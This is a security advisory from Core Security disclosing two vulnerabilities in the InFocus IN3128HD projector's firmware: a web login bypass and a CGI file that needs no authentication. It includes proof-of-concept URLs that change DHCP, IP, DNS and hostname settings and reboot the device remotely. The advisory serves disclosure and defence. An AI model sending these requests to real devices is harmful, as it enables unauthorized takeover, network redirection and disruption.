
Title: InFocus IN3128HD Projector Multiple Vulnerabilities
Advisory URL: http://www.coresecurity.com/advisories/infocus-in3128hd-projector-multiple-vulnerabilities
Date published: 2015-04-27
Date of last update: 2015-04-22
Vendors contacted: InFocus
Release mode: User release

2. Vulnerability Information

Class: Authentication Bypass Using an Alternate Path or Channel [CWE-288], Missing Authentication for Critical Function [CWE-306]
Impact: Security bypass
Remotely Exploitable: Yes
Locally Exploitable: No
CVE Name: CVE-2014-8383, CVE-2014-8384



3. Vulnerability Description

The InFocus [1] IN3128HD brings 1080p projection into the classroom with a bright 4000-lumen display, versatile connections and smart networking features. It's portable enough to go from room to room, yet powerful enough to be installed in a fixed position.

The InFocus IN3128HD [2] Projector is vulnerable to an authentication bypass in its web interface login page, and is missing authentication for the "webctrl.cgi.elf" CGI file, which allows several actions to be performed or configured inside the device.

4. Vulnerable Packages

InFocus IN3128HD v0.26 Firmware
Other products and versions might be affected too, but they were not tested.

5. Vendor Information, Solutions and Workarounds

Core Security recommends affected users avoid connecting their vulnerable devices to a remotely accessible network.

Contact the vendor for further information.

6. Credits

This vulnerability was discovered and researched by Joaquin Rodriguez Varela from Core Security CoreLabs Team. The publication of this advisory was coordinated by the Core Security Advisories Team.



7. Technical Description / Proof of Concept Code

7.1. Authentication Bypass in web server interface


 
http://<Projector-web-interface-IP>/main.html
         
This allows an unauthenticated user to access the device as an administrator and to see private information such as network configuration (network mask, DNS server, gateway, etc), WiFi configuration (including password), and the ability to modify any of these parameters.

7.2. Missing Authentication for Critical CGI file

The vulnerability [CVE-2014-8384] is caused by a missing authentication mechanism for the "webctrl.cgi.elf" CGI file, which is used by the web server to apply configuration changes. This file is located inside the "cgi-bin" folder, and is accessible by any unauthenticated user, allowing it to perform several configuration modifications and actions inside the projector.

Here are some examples of what can be done remotely and without authentication if the following URLs are used:

 

Modify any parameter in the DHCP Server configuration:

http://<Projector-web-interface-IP>/cgi-bin/webctrl.cgi.elf?&t:26,c:5,p:525294,s:00011&t:26,c:5,p:525295,s:0009<START-IP>&t:26,c:5,p:525296,s:0011<END-IP>&t:26,c:5,p:525297,s:0013<SUBNET-MASK-IP>&t:26,c:5,p:525298,s:0011<DEFAULT-GATEWAY-IP>&t:26,c:5,p:525299,s:0012<DNS-SERVER-IP>


Modify any parameter in the device IP configuration (DNS server as well):

http://<Projector-web-interface-IP>/cgi-bin/webctrl.cgi.elf?&t:26,c:5,p:525288,s:0006static&t:26,c:5,p:525289,s:0007<IP-ADDRESS>&t:26,c:5,p:525290,s:0013<SUBNET-MASK-IP>&t:26,c:5,p:525291,s:0007<DEFAULT-GATEWAY-IP>&t:26,c:5,p:525292,s:0007<DNS-SERVER-IP>


Remotely reboot the device (not only the web server):

http://<Projector-web-interface-IP>/cgi-bin/webctrl.cgi.elf?&t:26,c:5,p:720896


Change the device hostname:

http://<Projector-web-interface-IP>/cgi-bin/webctrl.cgi.elf?&t:26,p:589826,c:5,s:0006<NEW-HOSTNAME>

 
Several other actions and configurations can be performed using this CGI file, but is trivial to detail all of them considering that are the same actions a user can perform from the web interface.

